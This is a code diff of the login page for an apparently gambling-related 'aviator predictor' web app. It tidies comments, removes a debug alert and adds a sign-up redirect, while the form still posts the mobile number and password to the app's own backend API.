@@ -221,6 +221,7 @@
             text-decoration: none;
             font-size: 16px;
             margin-left: 4px;
+            cursor: pointer;
         }
 
         .signup-text a:hover {
@@ -340,7 +341,6 @@
             <a href="#">Forgot Password?</a>
         </div>
 
-        <!-- BUTTON WITH onclick DIRECTLY -->
         <button class="login-btn" onclick="doLogin()">
             <span class="spinner" id="spinner"></span>
             <span class="btn-text" id="btnText">Login</span>
@@ -351,19 +351,16 @@
         </div>
 
         <p class="signup-text">
-            <a href="#">Sign Up</a>
+            <a onclick="goToSignup()">Sign Up</a>
         </p>
 
     </div>
 
     <script>
         // ============================================
-        // SIMPLEST WORKING VERSION
-        // NO event listeners, NO DOMContentLoaded
-        // Just a simple function called by onclick
+        // LOGIN PAGE - WORKING
         // ============================================
 
-        // Get elements (global scope)
         var mobileInput = document.getElementById('mobileNumber');
         var passwordInput = document.getElementById('password');
         var spinner = document.getElementById('spinner');
@@ -372,19 +369,16 @@
         var loadingOverlay = document.getElementById('loadingOverlay');
         var loginBtn = document.querySelector('.login-btn');
 
-        // Show message
         function showMessage(text, type) {
             messageDiv.textContent = text;
             messageDiv.className = type;
         }
 
-        // Hide message
         function hideMessage() {
             messageDiv.textContent = '';
             messageDiv.className = '';
         }
 
-        // Show loading
         function showLoading() {
             loginBtn.disabled = true;
             spinner.classList.add('active');
@@ -392,7 +386,6 @@
             loadingOverlay.classList.add('active');
         }
 
-        // Hide loading
         function hideLoading() {
             loginBtn.disabled = false;
             spinner.classList.remove('active');
@@ -400,15 +393,10 @@
             loadingOverlay.classList.remove('active');
         }
 
-        // ===== MAIN LOGIN FUNCTION (called by button) =====
         function doLogin() {
-            // Show that button was clicked
-            alert('✅ Button clicked! Loading spinner will appear now!');
-
             var mobileNumber = mobileInput.value.trim();
             var password = passwordInput.value.trim();
 
-            // Validate
             if (!mobileNumber || !password) {
                 showMessage('⚠️ Please enter both mobile number and password.', 'error');
                 return;
@@ -421,18 +409,13 @@
             }
 
             hideMessage();
-            
-            // ===== SHOW LOADING SPINNER =====
             showLoading();
 
-            // ===== SEND TO BACKEND =====
             var apiUrl = 'https://betwayaviatorpredictor-production-911a.up.railway.app/api/login';
 
             fetch(apiUrl, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     mobileNumber: mobileNumber,
                     password: password
@@ -443,7 +426,6 @@
             })
             .then(function(data) {
                 hideLoading();
-
                 if (data.success) {
                     showMessage('✅ Login successful! Redirecting...', 'success');
                     showLoading();
@@ -460,7 +442,10 @@
             });
         }
 
-        // Also support Enter key
+        function goToSignup() {
+            window.location.href = 'signup.html';
+        }
+
         document.onkeypress = function(e) {
             if (e.key === 'Enter') {
                 var active = document.activeElement;
